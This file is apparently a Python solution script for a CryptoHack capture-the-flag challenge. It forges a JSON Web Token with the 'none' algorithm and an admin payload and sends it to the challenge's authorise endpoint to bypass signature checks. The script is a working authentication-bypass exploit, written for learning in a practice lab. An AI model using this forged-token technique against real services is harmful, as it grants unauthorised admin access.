#!/usr/bin/env python3

import base64
import json
import requests

# Challenge base URL
BASE_URL = "https://web.cryptohack.org/no-way-jose"

def b64url_encode(data: bytes) -> bytes:
    """
    Encode bytes using base64url without padding,
    as required by JWT specification.
    """
    return base64.urlsafe_b64encode(data).rstrip(b'=')

# -------------------------------------------------
# Step 1: Create malicious JWT header
# -------------------------------------------------
# We change algorithm to "none" so the server
# disables signature verification.
header = {
    "typ": "JWT",
    "alg": "none"
}

# -------------------------------------------------
# Step 2: Create payload with admin privileges
# -------------------------------------------------
payload = {
    "admin": True
}

# -------------------------------------------------
# Step 3: Encode header and payload
# -------------------------------------------------
header_b64 = b64url_encode(json.dumps(header).encode())
payload_b64 = b64url_encode(json.dumps(payload).encode())

# -------------------------------------------------
# Step 4: Construct unsigned token
# -------------------------------------------------
# JWT format is:
# base64url(header).base64url(payload).signature
#
# Since alg = "none", we leave signature empty
# but keep the trailing dot.
token = header_b64 + b"." + payload_b64 + b"."

print("[+] Forged JWT:")
print(token.decode())
print()

# -------------------------------------------------
# Step 5: Send token to authorise endpoint
# -------------------------------------------------
url = f"{BASE_URL}/authorise/{token.decode()}/"

response = requests.get(url)

print("[+] Server Response:")
print(response.json())
